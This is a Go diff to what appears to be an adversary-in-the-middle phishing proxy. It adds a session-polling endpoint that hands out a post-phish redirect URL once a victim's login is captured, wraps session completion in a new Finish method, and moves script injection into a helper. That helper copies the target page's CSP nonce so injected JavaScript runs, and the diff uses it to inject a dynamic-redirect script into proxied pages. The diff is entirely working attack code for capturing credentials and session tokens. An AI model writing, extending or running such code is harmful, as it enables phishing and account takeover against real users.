@@ -15,6 +15,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html"
 	"io"
@@ -188,6 +189,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
+
+			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
+			if redir_re.MatchString(req.URL.Path) {
+				ra := redir_re.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 2 {
+					session_id := ra[1]
+					if _, ok := p.sessions[session_id]; ok {
+						redirect_url, ok := p.waitForRedirectUrl(session_id)
+						if ok {
+							type ResponseRedirectUrl struct {
+								RedirectUrl string `json:"redirect_url"`
+							}
+							d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
+							if err == nil {
+								log.Important("[%d] dynamic redirect to URL: %s", ps.Index, redirect_url)
+								resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
+								return req, resp
+							}
+						}
+						resp := goproxy.NewResponse(req, "application/json", 408, "")
+						return req, resp
+					} else {
+						log.Warning("api: session not found: '%s'", session_id)
+					}
+				}
+			}
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
@@ -681,8 +708,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
-								s.IsDone = true
-								s.IsAuthUrl = true
+								s.Finish(true)
 								break
 							}
 						}
@@ -874,7 +900,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
 							log.Error("database: %v", err)
 						}
-						s.IsDone = true
+						s.Finish(false)
 					}
 				}
 			}
@@ -976,15 +1002,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								//log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
-								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
-								js_nonce := ""
-								if m_nonce != nil {
-									js_nonce = " nonce=\"" + m_nonce[1] + "\""
-								}
-								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
-								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
+								body = p.injectJavascriptIntoBody(body, script)
+							}
+
+							if s.RedirectURL != "" {
+								dynamic_redirect_js := DYNAMIC_REDIRECT_JS
+								dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
+								body = p.injectJavascriptIntoBody(body, dynamic_redirect_js)
 							}
 						}
 					}
@@ -1046,6 +1070,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	return p, nil
 }
 
+func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
+
+	s, ok := p.sessions[session_id]
+	if ok {
+
+		if s.IsDone {
+			return s.RedirectURL, true
+		}
+
+		ticker := time.NewTicker(30 * time.Second)
+		select {
+		case <-ticker.C:
+			break
+		case <-s.DoneSignal:
+			return s.RedirectURL, true
+		}
+	}
+	return "", false
+}
+
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	if len(p.cfg.general.RedirectUrl) > 0 {
 		redirect_url := p.cfg.general.RedirectUrl
@@ -1085,6 +1129,18 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 		return req, resp
 	}
 	return req, nil
+}
+
+func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string) []byte {
+	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	js_nonce := ""
+	if m_nonce != nil {
+		js_nonce = " nonce=\"" + m_nonce[1] + "\""
+	}
+	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	ret := []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
+	return ret
 }
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
